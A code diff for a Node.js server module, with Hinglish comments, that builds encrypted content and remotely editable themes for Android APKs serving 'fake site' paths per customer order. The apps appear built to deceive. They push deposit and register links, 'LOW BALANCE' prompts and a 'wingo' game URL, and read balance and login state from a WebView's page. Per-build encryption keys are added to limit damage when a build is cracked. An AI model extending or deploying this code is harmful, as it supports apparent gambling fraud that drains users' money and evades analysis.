@@ -33,6 +33,15 @@ function normalizePathKey(value) {
   return p;
 }
 
+// ── kid path-suffix parser (Java per-build keys) ──
+// Naye Java APKs path ke aage "~<24-hex-kid>" bhejte hain (MainActivity
+// source change ke bina kid travel karne ka tareeka). Split karke baaki
+// poora lookup unchanged rakhte hain.
+function splitPathKid(raw) {
+  const m = String(raw || '').match(/^(.*)~([a-f0-9]{24})$/);
+  return m ? { key: m[1], kid: m[2] } : { key: String(raw || ''), kid: null };
+}
+
 // Order dhundo — real, primary fake, ya EXTRA fake site (order_fake_sites)
 // path — teeno me se kisi bhi path pe content serve hota hai.
 function findOrderByPath(pathKey) {
@@ -66,10 +75,10 @@ function findOrderByPath(pathKey) {
   return { row: fs, isFake: true, fakeSite: fs };
 }
 
-async function encryptToBuffer(html) {
+async function encryptToBuffer(html, password) {
   const tmp = path.join(os.tmpdir(), `zayro_content_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`);
   try {
-    await encryptHtmlToBin(html, tmp, FIXED_PASSWORD);
+    await encryptHtmlToBin(html, tmp, password || FIXED_PASSWORD);
     const buf = fs.readFileSync(tmp);
     fs.unlinkSync(tmp);
     return buf;
@@ -77,6 +86,28 @@ async function encryptToBuffer(html) {
     try { fs.unlinkSync(tmp); } catch (_) {}
     return null;
   }
+}
+
+// ── PER-BUILD KEY RESOLVER (Flutter engine) ──
+// Flutter APK content fetch karte waqt ?kid=<key_id> bhejta hai. Uski apni
+// unique password se response encrypt hota hai — ek build crack hui to
+// sirf waheen tak blast radius. kid na ho / na mile (ya row inactive ho)
+// to FIXED_PASSWORD fallback — purane Java APKs waise hi chalte rahte hain
+// (key history: rebuild pe nayi kid aati hai, purani active hi rehti hai).
+function resolveContentPassword(pathKey, kid) {
+  try {
+    const k = String(kid || '').trim();
+    if (!/^[a-zA-Z0-9_-]{16,40}$/.test(k)) return FIXED_PASSWORD;
+    const row = db.prepare(
+      'SELECT key_secret, engine FROM build_keys WHERE key_id=? AND firebase_path=? AND active=1 ORDER BY id DESC LIMIT 1'
+    ).get(k, String(pathKey || ''));
+    if (row && row.key_secret) {
+      // java builds: key_secret = plaintext base64 string (APK String se match).
+      // flutter builds: base64 enc bytes — dono engines ka format alag hai.
+      return row.engine === 'java' ? row.key_secret : Buffer.from(row.key_secret, 'base64');
+    }
+  } catch (_) {}
+  return FIXED_PASSWORD;
 }
 
 function buildParams(orderRow, designRow, isFake, fakeSite) {
@@ -127,8 +158,11 @@ function buildParams(orderRow, designRow, isFake, fakeSite) {
 }
 
 // kind: 'popup' | 'loading'
-async function buildAppContent(pathKey, kind = 'popup') {
+async function buildAppContent(pathKey, kind = 'popup', kid = null) {
   try {
+    const sp = splitPathKid(pathKey);
+    pathKey = sp.key;
+    if (!kid) kid = sp.kid;
     const found = findOrderByPath(pathKey);
     if (!found) return null;
     const { row, isFake, fakeSite } = found;
@@ -155,10 +189,90 @@ async function buildAppContent(pathKey, kind = 'popup') {
       html = normalizeRegisterDelay(ensureAudioGate(injectParams(raw, params), params.domain));
     }
 
-    return await encryptToBuffer(html);
+    return await encryptToBuffer(html, resolveContentPassword(pathKey, kid));
   } catch (e) {
     return null;
   }
 }
 
-module.exports = { buildAppContent };
+// ── NATIVE THEME JSON (Flutter engine — HYBRID design update) ──
+// Flutter APK ka UI compiled Dart me hota hai. Design ke VARIABLE parts
+// (links, colors, texts, amounts, selectors, sound map) yahan se encrypted
+// JSON me aate hain — server pe edit karo, app next launch pe naya theme
+// le leti hai. Bina APK rebuild ke rozmarra ke changes.
+async function buildAppTheme(pathKey, kid = null) {
+  const sp0 = splitPathKid(pathKey);
+  pathKey = sp0.key;
+  if (!kid) kid = sp0.kid;
+  try {
+    const found = findOrderByPath(pathKey);
+    if (!found) return null;
+    const { row, isFake, fakeSite } = found;
+    const design = {
+      popup_html_file: row.popup_html_file,
+      fake_popup_html_file: row.fake_popup_html_file,
+      java_type: row.java_type,
+      category: row.category
+    };
+    const params = buildParams(row, design, isFake, fakeSite);
+    if (!params) return null;
+
+    const designRow = db.prepare('SELECT native_key, name FROM designs WHERE id=?').get(row.design_id);
+    const theme = {
+      v: 1,
+      engine: 'flutter',
+      designKey: (designRow && designRow.native_key) ? designRow.native_key : 'default',
+      brandTitle: params.brandTitle || '',
+      minDeposit: params.minDeposit || 300,
+      urls: {
+        register: params.registerUrl,
+        deposit: params.depositUrl,
+        wingo: params.wingoUrl,
+        domain: params.domain
+      },
+      liveLinkEnabled: !!row.live_link_enabled,
+      colors: {
+        bg: '#050310',
+        primary: (row.theme_color && String(row.theme_color).trim()) || '#ff1e1e',
+        accent: '#ffb700',
+        text: '#ffffff',
+        danger: '#ff4d6d'
+      },
+      // Gate selectors — logged-in / balance detect karne ke liye WebView
+      // DOM me ye dekhe jaate hain (HTML gate ke __sel wale same defaults).
+      selectors: {
+        balance: [
+          '.amount .a1 .a', '.gameHeader__C-balance', '.Wallet__C-balance-l1',
+          '.walletInfo__C-balance', '.headerInfo__C-right', '.header__money',
+          '.header-money', '.top-bar__balance', '.userInfo__C-balance',
+          '.balance-amount', '.my-amount', '.balance', '.wallet-amount'
+        ],
+        userInfo: '.userInfo, .user-info, .headerInfo, [class*=user-info], [class*=userInfo], [class*=avatar], .my__info'
+      },
+      sounds: {
+        register: 'register.mp3',
+        loginSuccess: 'successful.mp3',
+        lowBalance: 'lowbalance.mp3',
+        intro: 'intro.mp3'
+      },
+      texts: {
+        networkProblem: 'Network Problem',
+        retry: 'RETRY',
+        depositTitle: 'LOW BALANCE',
+        depositSubtitle: 'Wallet me minimum deposit karein',
+        warnTitle: 'ALREADY REGISTERED?',
+        warnMsg: 'Ye number pehle se registered lag raha hai. Login karein.',
+        securityFailed: 'Security Verification Failed',
+        securityFailedSub: 'This app cannot run on this device. Please install the official version.'
+      },
+      orderId: row.id,
+      updatedAt: Date.now()
+    };
+
+    return await encryptToBuffer(JSON.stringify(theme), resolveContentPassword(pathKey, kid));
+  } catch (e) {
+    return null;
+  }
+}
+
+module.exports = { buildAppContent, buildAppTheme, resolveContentPassword };
